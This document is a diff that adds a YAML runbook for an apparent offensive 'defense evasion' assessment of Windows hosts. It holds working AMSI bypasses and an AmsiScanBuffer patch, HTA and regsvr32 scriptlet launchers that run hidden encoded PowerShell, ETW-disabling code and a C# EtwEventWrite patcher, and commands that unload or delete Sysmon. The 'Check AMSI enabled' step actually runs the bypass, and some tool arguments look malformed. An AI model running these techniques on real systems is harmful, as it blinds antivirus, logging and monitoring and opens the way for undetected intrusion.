@@ -1,0 +1,250 @@
+# v2 runbook — Defense evasion techniques
+name: "Defense Evasion"
+description: "AMSI bypasses, AppLocker bypasses, ETW patching, sysmon evasion, AV testing, and logging configuration assessment"
+version: "2.0"
+
+vars:
+  target_host: ""
+  target_user: ""
+  target_domain: ""
+  listener_ip: ""
+  listener_port: 443
+  payload_type: "powershell"  # powershell | csharp | cscript | wmic
+
+steps:
+  - id: preamble
+    type: log
+    message: "Defense evasion assessment — {target_host} (case: {case_id})"
+
+  # Phase 1: AMSI assessment & bypass
+  - id: amsi
+    name: "AMSI bypass techniques"
+    type: sequential
+    steps:
+      - id: amsi_check
+        name: "Check AMSI enabled"
+        tool: powershell
+        args: ["-Command",
+               "& {[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}",
+               "2>&1",
+               "-o", "{case_dir}/amsi_check.txt"]
+        timeout: 15
+
+      - id: amsi_patch
+        name: "AMSI patch bypass"
+        tool: powershell
+        args: ["-Command",
+               "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
+               "-o", "{case_dir}/amsi_patch.txt"]
+        timeout: 15
+        artifacts: ["{case_dir}/amsi_patch.txt"]
+
+      - id: amsi_memory
+        name: "AMSI memory patching"
+        tool: python3
+        args: ["-c",
+               "\"# Generate AMSI patch shellcode\nimport binascii\n# Patching amsi.dll!AmsiScanBuffer to return 0\namsi_patch = binascii.unhexlify('B800000000C3')\nopen('{case_dir}/amsi_patch.bin','wb').write(amsi_patch)\nprint('AMSI patch shellcode written')\"",
+               "-o", "{case_dir}/amsi_patch_gen.txt"]
+        timeout: 15
+
+  # Phase 2: AppLocker enumeration
+  - id: applocker
+    name: "AppLocker enumeration"
+    type: parallel
+    max_workers: 4
+    steps:
+      - id: al_policy
+        name: "Get AppLocker policy"
+        tool: powershell
+        args: ["-Command",
+               "Get-AppLockerPolicy -Effective | ConvertTo-Json",
+               "-o", "{case_dir}/applocker_policy.json"]
+        timeout: 30
+        artifacts: ["{case_dir}/applocker_policy.json"]
+
+      - id: al_bypass_lolbin
+        name: "Check LOLBins available"
+        tool: powershell
+        args: ["-Command",
+               "Get-Command -Name powershell,cscript,wscript,mshta,rundll32,regsvr32,certutil,msiexec,bitsadmin -ErrorAction SilentlyContinue | Select Name,Source",
+               "-o", "{case_dir}/lolbin_available.txt"]
+        timeout: 15
+
+      - id: al_bypass_paths
+        name: "Check writable paths"
+        tool: powershell
+        args: ["-Command",
+               "Get-ChildItem 'C:\\Windows\\Temp','C:\\Users\\Public','C:\\Windows\\Tasks','C:\\Windows\\System32\\Tasks' -ErrorAction SilentlyContinue | Select FullName",
+               "-o", "{case_dir}/writable_paths.txt"]
+        timeout: 15
+
+      - id: al_installer
+        name: "Check installer detection"
+        tool: powershell
+        args: ["-Command",
+               "Get-CimInstance Win32_Product | Select Name,Vendor,Version",
+               "-o", "{case_dir}/installed_software.txt"]
+        timeout: 30
+
+  # Phase 3: AppLocker bypass generation
+  - id: ask_bypass
+    type: prompt
+    message: "Generate AppLocker bypass payload?"
+    then:
+      - id: al_bypass_cl
+        name: "InstallUtil bypass"
+        tool: csc
+        args: ["/target:exe",
+               "/out:{case_dir}/InstallUtilBypass.exe",
+               "/reference:System.Configuration.Install.dll",
+               "-o", "{case_dir}/InstallUtilBypass.cs"]
+        timeout: 30
+        when: "payload_type == csharp"
+
+      - id: al_bypass_mshta
+        name: "MSHTA bypass"
+        tool: python3
+        args: ["-c",
+               "\"hta='''<script>var r=new ActiveXObject(\\\"WScript.Shell\\\");r.Run(\\\"powershell -w hidden -enc BASE64_PAYLOAD\\\",0,false);</script>'''\nopen('{case_dir}/mshta_bypass.hta','w').write(hta)\nprint('MSHTA bypass created')\"",
+               "-o", "{case_dir}/mshta_bypass.hta"]
+        timeout: 15
+        when: "payload_type == powershell"
+
+      - id: al_bypass_sct
+        name: "Regsvr32 .sct bypass"
+        tool: python3
+        args: ["-c",
+               "\"sct='''<?XML version=\\\"1.0\\\"?><scriptlet><registration progid=\\\"Test\\\" classid=\\\"{10001111-0000-0000-0000-0000FEEDACDC}\\\"><script language=\\\"JScript\\\"><![CDATA[var r=new ActiveXObject(\\\"WScript.Shell\\\").Run(\\\"powershell -w hidden -enc BASE64_PAYLOAD\\\",0,false);]]></script></registration></scriptlet>'''\nopen('{case_dir}/regsvr32_bypass.sct','w').write(sct)\nprint('Regsvr32 .sct bypass created')\"",
+               "-o", "{case_dir}/regsvr32_bypass.sct"]
+        timeout: 15
+
+  # Phase 4: ETW patching
+  - id: etw
+    name: "ETW patching"
+    type: parallel
+    steps:
+      - id: etw_check
+        name: "Check ETW status"
+        tool: powershell
+        args: ["-Command",
+               "Get-WinEvent -ListLog * -ErrorAction SilentlyContinue | Where-Object {$_.IsEnabled} | Format-Table LogName,IsEnabled -AutoSize",
+               "-o", "{case_dir}/etw_status.txt"]
+        timeout: 30
+
+      - id: etw_patch
+        name: "ETW bypass via .NET"
+        tool: powershell
+        args: ["-Command",
+               "$k=[System.Reflection.Emit.OpCodes].Assembly.GetType('System.Reflection.Emit.OpCodes').Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider');$f=$k.GetField('etwProvider','NonPublic,Static');$f.SetValue($null,$null)",
+               "-o", "{case_dir}/etw_patch.txt"]
+        timeout: 15
+        artifacts: ["{case_dir}/etw_patch.txt"]
+
+      - id: etw_patch_cs
+        name: "ETW patcher C#"
+        tool: python3
+        args: ["-c",
+               "\"cs='''using System;using System.Runtime.InteropServices;class Program{static void Main(){var lib=Win32.LoadLibrary(\\\"ntdll.dll\\\");var addr=Win32.GetProcAddress(lib,\\\"EtwEventWrite\\\");byte[] patch={0xC3};Marshal.Copy(patch,0,addr,1);Console.WriteLine(\\\"ETW patched\\\");}}class Win32{[DllImport(\\\"kernel32\\\")]public static extern IntPtr LoadLibrary(string n);[DllImport(\\\"kernel32\\\")]public static extern IntPtr GetProcAddress(IntPtr h,string n);}'''\nopen('{case_dir}/etw_patcher.cs','w').write(cs)\nprint('ETW patcher written')\"",
+               "-o", "{case_dir}/etw_patcher_gen.txt"]
+        timeout: 15
+
+  # Phase 5: Sysmon evasion
+  - id: sysmon
+    name: "Sysmon evasion"
+    type: sequential
+    steps:
+      - id: sysmon_check
+        name: "Check Sysmon running"
+        tool: powershell
+        args: ["-Command",
+               "Get-Process -Name Sysmon -ErrorAction SilentlyContinue; Get-CimInstance -ClassName Win32_Service -Filter \"Name='Sysmon'\" | Select Name,State,StartMode,PathName",
+               "-o", "{case_dir}/sysmon_status.txt"]
+        timeout: 15
+        artifacts: ["{case_dir}/sysmon_status.txt"]
+
+      - id: sysmon_config
+        name: "Get Sysmon config"
+        tool: powershell
+        args: ["-Command",
+               "$sp=Get-CimInstance Win32_Service -Filter \"Name='Sysmon'\" | Select -ExpandProperty PathName; Write-Output $sp",
+               "-o", "{case_dir}/sysmon_config.txt"]
+        timeout: 15
+
+      - id: sysmon_uninstall
+        name: "Sysmon driver unload"
+        tool: python3
+        args: ["-c",
+               "\"print('Sysmon removal via fltmc: fltmc.exe unload SysmonDrv')\nprint('Or via sc: sc.exe delete Sysmon')\"",
+               "-o", "{case_dir}/sysmon_removal_cmds.txt"]
+        timeout: 15
+
+  # Phase 6: AV testing
+  - id: av_test
+    name: "AV/EDR testing"
+    type: sequential
+    steps:
+      - id: av_check
+        name: "Check AV products"
+        tool: powershell
+        args: ["-Command",
+               "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct 2>$null | Select displayName,productState,pathToSignedProductExe",
+               "-o", "{case_dir}/av_products.txt"]
+        timeout: 15
+        artifacts: ["{case_dir}/av_products.txt"]
+
+      - id: amsi_trigger
+        name: "AMSI trigger test"
+        tool: python3
+        args: ["-c",
+               "\"# Generate AMSI trigger strings\ntriggers=['amsiutils','invoke-mimikatz','Invoke-ReflectivePEInjection','AmsiScanBuffer','amsi.dll','ScanContent','DALLAS','VBA','Matt']\nwith open('{case_dir}/amsi_triggers.txt','w') as f:\n for t in triggers: f.write(t+'\\n')\nprint(f'Wrote {len(triggers)} AMSI triggers')\"",
+               "-o", "{case_dir}/amsi_triggers_gen.txt"]
+        timeout: 15
+
+  # Phase 7: Logging configuration
+  - id: logging
+    name: "Windows logging assessment"
+    type: parallel
+    steps:
+      - id: log_audit
+        name: "Audit policy"
+        tool: powershell
+        args: ["-Command",
+               "auditpol /get /category:*",
+               "-o", "{case_dir}/audit_policy.txt"]
+        timeout: 30
+
+      - id: log_ps
+        name: "PowerShell logging"
+        tool: powershell
+        args: ["-Command",
+               "Get-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging 2>$null; Get-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging 2>$null; Get-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription 2>$null",
+               "-o", "{case_dir}/ps_logging.txt"]
+        timeout: 15
+        artifacts: ["{case_dir}/ps_logging.txt"]
+
+  # Phase 8: Report
+  - id: report
+    name: "Generate defense evasion report"
+    type: report
+    format: markdown
+    title: "Defense Evasion Report"
+    output: "{case_dir}/defense-evasion-report.md"
+    sections:
+      - heading: "Target"
+        body: "- Host: {target_host}\n- User: {target_domain}\\{target_user}\n- Payload type: {payload_type}"
+      - heading: "AMSI"
+        body: "- Status: {case_dir}/amsi_check.txt\n- Patched: {case_dir}/amsi_patch.txt\n- Triggers: {case_dir}/amsi_triggers.txt"
+      - heading: "AppLocker"
+        body: "- Policy: {case_dir}/applocker_policy.json\n- LOLBins: {case_dir}/lolbin_available.txt\n- Bypasses: {case_dir}/mshta_bypass.hta, {case_dir}/regsvr32_bypass.sct"
+      - heading: "ETW"
+        body: "- Status: {case_dir}/etw_status.txt\n- Patch: {case_dir}/etw_patch.txt\n- C# patcher: {case_dir}/etw_patcher.cs"
+      - heading: "Sysmon"
+        body: "- Status: {case_dir}/sysmon_status.txt\n- Removal: {case_dir}/sysmon_removal_cmds.txt"
+      - heading: "AV/Logging"
+        body: "- AV products: {case_dir}/av_products.txt\n- Audit policy: {case_dir}/audit_policy.txt\n- PS logging: {case_dir}/ps_logging.txt"
+
+postflight:
+  - id: done
+    type: notify
+    level: warning
+    message: "Defense evasion assessment complete — {case_dir}"
